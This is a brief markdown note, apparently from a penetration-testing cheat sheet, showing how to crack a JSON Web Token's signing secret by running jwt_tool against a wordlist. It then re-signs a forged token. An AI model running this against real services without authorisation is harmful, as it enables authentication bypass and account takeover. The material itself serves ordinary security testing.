# Brute Forcing JSON Web Tokens (JWTs)

## Brute Force JWT Secret with Wordlist

[jwt_tool](https://github.com/ticarpi/jwt_tool)

```bash
python3 jwt_tool $JWT -C -d $PATH_TO_WORDLIST
```

The output of a successful attack will print the `jwt_tool` command you can use to modify and resign the JWT.